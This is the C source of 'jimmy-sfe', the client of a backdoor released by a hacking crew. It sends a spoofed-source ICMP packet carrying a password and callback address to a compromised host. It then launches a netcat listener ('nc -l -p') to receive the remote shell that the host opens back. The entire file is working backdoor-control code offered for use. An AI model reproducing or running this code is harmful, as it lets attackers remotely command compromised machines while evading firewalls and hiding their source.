/*
         Double Dragon Backdoor SFE (Special Firewall Edition)
                by tHE rECIdjVO <recidjvo@pkcrew.org>

                   Member of the Packet Knights Crew
                        http://www.pkcrew.org/

                        ---> Player 2: Jimmy
								*/

// Set here the ICMP type
#define ICMP_TYPE 0

#define PROGRAM "jimmy-sfe"
#define AUTHOR "tHE rECIdjVO <recidjvo@pkcrew.org>"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>

// Data to send
struct cb_data{
    char pass[30];
    u_long jimmy_ip;
    u_short jimmy_port;
};

int main(int argc, char *argv[]);
void send_icmp(char *argv[]);
u_long resolv(char *hostname);
u_short in_chksum(u_short *,int);

int main(int argc, char *argv[])
{
	char commandline[64];

	if(argc != 6) {
		printf(PROGRAM " by " AUTHOR "\n");
		printf("usage: %s <ranzou_addr> <ranzou_pass> <jimmy_ip> <jimmy_port> <spoofed_ip>\n", argv[0]);
		exit(0);
	}

	bzero(commandline, 64);
	sprintf(commandline, "nc -l -p %s", argv[4]); 
	// Send ICMP packet to initialize the callback
	send_icmp(argv);
	// Run netcat to accept the callback connection
	system(commandline);
	exit(0);
}

void send_icmp(char *argv[])
{
	struct cb_data *pdata;
	struct ip *pip;
	struct icmp *picmp;
	struct sockaddr_in from;
	int sock;
	char *packet;
	int hincl = 1;

	// Create the raw socket
	if((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
		printf("socket() error.\nAre you really root?\n");
		exit(1);
	}
	// Get privileges to modify the ip header
	if(setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&hincl,sizeof(hincl)) < 0) {
		printf("setsockopt() error.\n");
		close(sock);
		exit(1);
	}

	// Set pointers
	packet = malloc(sizeof(struct ip) + sizeof(struct icmp) + 64);
	pip = (struct ip *)packet;
	picmp = (struct icmp *)(packet + sizeof(struct ip));
	pdata = (struct cb_data *)(packet + sizeof(struct ip) + sizeof(struct icmp));
	memset(packet, 0, sizeof(struct ip) + sizeof(struct icmp) + 64);
	// Initialize the ICMP fields
	from.sin_addr.s_addr = resolv(argv[1]);
	from.sin_family = AF_INET;
	pip->ip_len = htons(sizeof(struct ip) + sizeof(struct icmp) + 64);
	pip->ip_hl = 5;
	pip->ip_v = 4;
	pip->ip_ttl = 255;
	pip->ip_tos = 0;
	pip->ip_off = 0;
	pip->ip_id = htons(getpid());
	pip->ip_p = 1;
	pip->ip_src.s_addr = resolv(argv[5]);
	pip->ip_dst.s_addr = resolv(argv[1]);
	pip->ip_sum = in_chksum((u_short *)pip,20);
	picmp->icmp_type = ICMP_TYPE;
	picmp->icmp_code = 0;
	strcpy(pdata->pass, argv[2]);
	pdata->jimmy_ip = resolv(argv[3]);
	pdata->jimmy_port = atoi(argv[4]);
	picmp->icmp_cksum = in_chksum((u_short *)picmp, sizeof(struct icmp) + 64);

	// Finally, send the packet
	sendto(sock, packet, sizeof(struct ip) + sizeof(struct icmp) + 64, 0, (struct sockaddr *)&from ,sizeof(struct sockaddr_in));
}

u_long resolv(char *hostname) {
        // Resolve hostnames to IPv4

        u_long ipb;
        struct hostent *hp;

        if((hp = gethostbyname(hostname)) == NULL) {
                return(0);
        }
        memcpy(&ipb, hp->h_addr, hp->h_length);
        return(ipb);
}

u_short in_chksum(u_short *ptr, int nbytes)
{
	// Checksum
	register long sum;
	u_short oddbyte;
	register u_short answer;
	sum = 0;
	while(nbytes > 1) {
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1) {
		oddbyte = 0;
		*((u_char *) &oddbyte) = *(u_char *)ptr;
		sum += oddbyte;
	}

	sum  = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	answer = ~sum;

	return((u_short) answer);
}
